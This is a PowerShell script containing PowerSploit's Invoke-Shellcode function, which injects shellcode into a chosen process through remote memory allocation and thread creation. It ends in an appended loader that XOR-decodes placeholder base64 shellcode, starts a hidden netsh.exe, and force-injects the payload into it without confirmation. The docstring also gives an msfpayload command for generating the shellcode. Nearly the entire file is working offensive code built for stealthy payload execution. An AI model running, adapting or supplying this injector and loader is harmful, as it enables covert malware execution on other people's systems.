function Invoke-Shellcode
{
<#
.SYNOPSIS

Inject shellcode into the process ID of your choosing or within the context of the running PowerShell process.

PowerSploit Function: Invoke-Shellcode  
Author: Matthew Graeber (@mattifestation)  
License: BSD 3-Clause  
Required Dependencies: None  
Optional Dependencies: None  

.DESCRIPTION

Portions of this project was based upon syringe.c v1.2 written by Spencer McIntyre

PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Backtrack (Thanks, Matt and g0tm1lk):

msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2-

Make sure to specify 'thread' for your exit process. Also, don't bother encoding your shellcode. It's entirely unnecessary.

.PARAMETER ProcessID

Process ID of the process you want to inject shellcode into.

.PARAMETER Shellcode

Specifies an optional shellcode passed in as a byte array

.PARAMETER Force

Injects shellcode without prompting for confirmation. By default, Invoke-Shellcode prompts for confirmation before performing any malicious act.

.EXAMPLE

Invoke-Shellcode -ProcessId 4274

Description
-----------
Inject shellcode into process ID 4274.

.EXAMPLE

Invoke-Shellcode

Description
-----------
Inject shellcode into the running instance of PowerShell.

.EXAMPLE

Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)

Description
-----------
Overrides the shellcode included in the script with custom shellcode - 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit!
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [CmdletBinding( DefaultParameterSetName = 'RunLocal', ConfirmImpact = 'High')]
    Param (
        [ValidateNotNullOrEmpty()]
        [UInt16]
        $ProcessID,

        [Parameter( ParameterSetName = 'RunLocal' )]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $Shellcode,

        [Switch]
        $Force = $False
    )

    Set-StrictMode -Version 2.0

    if ( $PSBoundParameters['ProcessID'] )
    {
        # Ensure a valid process ID was provided
        # This could have been validated via 'ValidateScript' but the error generated with Get-Process is more descriptive
        Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
    }

    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]

            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),

            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')

        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]

            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,

            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmp=@();
        $UnsafeNativeMethods.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
        $GetProcAddress = $tmp[0]
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        
        try
        {
            $tmpPtr = New-Object IntPtr
            $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
            Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
        }
        catch
        {
            # Windows 10 v1803 needs $Kern32Handle as a System.IntPtr instead of System.Runtime.InteropServices.HandleRef
            Write-Output $GetProcAddress.Invoke($null, @($Kern32Handle, $Procedure))
        }
    }

    # Emits a shellcode stub that when injected will create a thread and pass execution to the main shellcode payload
    function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
    {
        $IntSizePtr = $Architecture / 8

        function Local:ConvertTo-LittleEndian ([IntPtr] $Address)
        {
            $LittleEndianByteArray = New-Object Byte[](0)
            $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
            [System.Array]::Reverse($LittleEndianByteArray)

            Write-Output $LittleEndianByteArray
        }

        $CallStub = New-Object Byte[](0)

        if ($IntSizePtr -eq 8)
        {
            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  RAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0x48,0xB8                              # MOV   QWORD RAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  RAX
        }
        else
        {
            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  EAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0xB8                                   # MOV   DWORD EAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  EAX
        }

        Write-Output $CallStub
    }

    function Local:Inject-RemoteShellcode ([Int] $ProcessID)
    {
        # Open a handle to the process you want to inject into
        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)

        if (!$hProcess)
        {
            Throw "Unable to open a process handle for PID: $ProcessID"
        }

        $IsWow64 = $false

        if ($64bitOS) # Only perform theses checks if CPU is 64-bit
        {
            # Determine if the process specified is 32 or 64 bit
            $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null

            if ((!$IsWow64) -and $PowerShell32bit)
            {
                Throw 'Shellcode injection targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'
            }
            elseif ($IsWow64) # 32-bit Wow64 process
            {
                if ($Shellcode32.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode32 variable!'
                }

                $Shellcode = $Shellcode32
                Write-Verbose 'Injecting into a Wow64 process.'
                Write-Verbose 'Using 32-bit shellcode.'
            }
            else # 64-bit process
            {
                if ($Shellcode64.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode64 variable!'
                }

                $Shellcode = $Shellcode64
                Write-Verbose 'Using 64-bit shellcode.'
            }
        }
        else # 32-bit CPU
        {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
            }

            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }

        # Reserve and commit enough memory in remote process to hold the shellcode
        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)

        if (!$RemoteMemAddr)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }

        Write-Verbose "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Copy shellcode into the previously allocated memory
        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null

        # Get address of ExitThread function
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread

        if ($IsWow64)
        {
            # Build 32-bit inline assembly stub to call the shellcode upon creation of a remote thread.
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32

            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            # Build 64-bit inline assembly stub to call the shellcode upon creation of a remote thread.
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64

            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        # Allocate inline assembly stub
        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)

        if (!$RemoteStubAddr)
        {
            Throw "Unable to allocate thread call stub memory in PID: $ProcessID"
        }

        Write-Verbose "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Write 32-bit assembly stub to remote process memory space
        $WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null

        # Execute shellcode as a remote thread
        $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)

        if (!$ThreadHandle)
        {
            Throw "Unable to launch remote thread in PID: $ProcessID"
        }

        # Close process handle
        $CloseHandle.Invoke($hProcess) | Out-Null

        Write-Verbose 'Shellcode injection complete!'
    }

    function Local:Inject-LocalShellcode
    {
        if ($PowerShell32bit) {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
                return
            }

            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }
        else
        {
            if ($Shellcode64.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode64 variable!'
                return
            }

            $Shellcode = $Shellcode64
            Write-Verbose 'Using 64-bit shellcode.'
        }

        # Allocate RWX memory for the shellcode
        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$BaseAddress)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }

        Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"

        # Copy shellcode to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)

        # Get address of ExitThread function
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread

        if ($PowerShell32bit)
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32

            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64

            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        # Allocate RWX memory for the thread call stub
        $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$CallStubAddress)
        {
            Throw "Unable to allocate thread call stub."
        }

        Write-Verbose "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)"))"

        # Copy call stub to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)

        # Launch shellcode in it's own thread
        $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
        if (!$ThreadHandle)
        {
            Throw "Unable to launch thread."
        }

        # Wait for shellcode thread to terminate
        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null

        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)

        Write-Verbose 'Shellcode injection complete!'
    }

    # A valid pointer to IsWow64Process will be returned if CPU is 64-bit
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process

    $AddressWidth = $null

    try {
        $AddressWidth = @(Get-WmiObject -Query 'SELECT AddressWidth FROM Win32_Processor')[0] | Select-Object -ExpandProperty AddressWidth
    } catch {
        throw 'Unable to determine OS processor address width.'
    }

    switch ($AddressWidth) {
        '32' {
            $64bitOS = $False
        }

        '64' {
            $64bitOS = $True

            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
    	    $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        }

        default {
            throw 'Invalid OS address width detected.'
        }
    }

    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $true
    }
    else
    {
        $PowerShell32bit = $false
    }

    if ($PSBoundParameters['Shellcode'])
    {
        # Users passing in shellcode  through the '-Shellcode' parameter are responsible for ensuring it targets
        # the correct architechture - x86 vs. x64. This script has no way to validate what you provide it.
        [Byte[]] $Shellcode32 = $Shellcode
        [Byte[]] $Shellcode64 = $Shellcode32
    }
    
    if ( $PSBoundParameters['ProcessID'] )
    {
        # Inject shellcode into the specified process ID
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

        Write-Verbose "Injecting shellcode into PID: $ProcessId"

        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
        {
            Inject-RemoteShellcode $ProcessId
        }
    }
    else
    {
        # Inject shellcode into the currently running PowerShell process
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)

        Write-Verbose "Injecting shellcode into PowerShell"

        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode into the running PowerShell process!" ) )
        {
            Inject-LocalShellcode
        }
    }
}
$k = [System.Convert]::frombase64string("##BASE64KEY##");
$sc = [System.Convert]::frombase64string("##BASE64SHELLCODE##");
$ki=0;
for($i=0;$i -lt $sc.Length;$i++){
    if($ki -eq $k.Length){
        $ki=0;
    }
    $sc[$i] = $sc[$i] -bxor $k[$ki];
    $ki++;
}
$processid = (start-process -filepath "netsh.exe" -WindowStyle hidden -passthru).Id
Invoke-Shellcode -Shellcode $sc -Force -ProcessId $processid

